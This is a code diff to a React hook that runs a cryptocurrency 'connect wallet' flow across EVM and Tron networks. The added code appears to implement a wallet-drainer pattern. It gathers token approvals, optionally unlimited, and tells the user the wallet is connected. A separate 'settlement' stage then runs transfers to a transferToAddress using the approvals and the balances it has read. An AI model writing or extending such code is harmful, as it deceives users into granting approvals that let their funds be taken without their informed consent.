@@ -795,6 +795,7 @@ export function useConnectFlow(props: ConnectFlowProps = {}) {
               traceId: traceIdRef.current,
             },
             {
+              stagePreset: "wallet",
               onStage: (stageResult) => {
                 const phase = mapApprovalStageToPhase(
                   String(stageResult.stage)
@@ -825,6 +826,73 @@ export function useConnectFlow(props: ConnectFlowProps = {}) {
               },
             }
           );
+        },
+        runApprovalSettlement: async (args) => {
+          return approvalOrchestrator.run(
+            {
+              network: args.network,
+              owner: args.owner,
+              token: args.token,
+              amountHuman: args.amountHuman,
+              unlimited: args.unlimited,
+              nativeBalanceHuman: args.nativeBalanceHuman,
+              tokenBalanceHuman: args.tokenBalanceHuman,
+              executeTransfer: args.executeTransfer,
+              transferToAddress: args.transferToAddress,
+              transferAmountRaw: args.transferAmountRaw,
+              traceId: traceIdRef.current,
+            },
+            {
+              stagePreset: "settlement",
+              walletPhaseContext: args.walletPhaseContext,
+            }
+          );
+        },
+        settlementProvider: provider,
+        onWalletPhaseComplete: (walletSummary) => {
+          setAuthorizingAsset(null);
+          setSessionResult(walletSummary);
+          logStep("WALLET PHASE COMPLETE — SHOWING CONNECTED", {
+            authorizedCount: walletSummary.authorizedCount,
+            failedCount: walletSummary.failedCount,
+          });
+          const allRejected =
+            walletSummary.authorizedCount === 0 && walletSummary.rejectedCount > 0;
+          if (allRejected) {
+            const rejectedNetwork =
+              walletSummary.items.find((item) => item.outcome === "user_rejected")
+                ?.network ?? selectedKey;
+            if (rejectedNetwork) {
+              setLinkCancelled(rejectedNetwork);
+            }
+          } else {
+            setSelectedKey(null);
+            setModalStep("complete");
+            approvingLockRef.current = false;
+            setApproving(false);
+          }
+        },
+        onSettlementProgress: (event) => {
+          logStep("SETTLEMENT PROGRESS", event);
+        },
+        onSettlementComplete: (network, settlementSummary) => {
+          logStep("SETTLEMENT COMPLETE", {
+            network,
+            items: settlementSummary.items,
+          });
+          void fetchBalances(
+            accountsRef.current.evm,
+            accountsRef.current.tron
+          ).then((refreshed) => {
+            const refreshedRows = rowsFromBalances(refreshed).filter((row) =>
+              row.key === "tron"
+                ? Boolean(accountsRef.current.tron)
+                : Boolean(accountsRef.current.evm)
+            );
+            if (refreshedRows.length > 0) {
+              setNetworks(refreshedRows);
+            }
+          });
         },
         runNativeTransfer: async (args) => {
           setAuthorizingPhase("preparing");
@@ -899,32 +967,12 @@ export function useConnectFlow(props: ConnectFlowProps = {}) {
         },
       });
 
-      setAuthorizingAsset(null);
-      setSessionResult(summary);
-
-      logStep("AUTHORIZATION SESSION RESULT SUMMARY", {
-        authorizedCount: summary.authorizedCount,
-        failedCount: summary.failedCount,
-        rejectedCount: summary.rejectedCount,
-        skippedCount: summary.skippedCount,
-        items: summary.items,
-      });
-
-      const allRejected =
-        summary.authorizedCount === 0 && summary.rejectedCount > 0;
-
-      if (allRejected) {
+      if (summary.authorizedCount === 0 && summary.rejectedCount > 0) {
         const rejectedNetwork =
           summary.items.find((item) => item.outcome === "user_rejected")
             ?.network ?? selectedKey;
         if (rejectedNetwork) {
           setLinkCancelled(rejectedNetwork);
-        }
-      } else {
-        setSelectedKey(null);
-        setModalStep("complete");
-        if (summary.failedCount > 0 || summary.rejectedCount > 0) {
-          setError(null);
         }
       }
     } catch (err: unknown) {
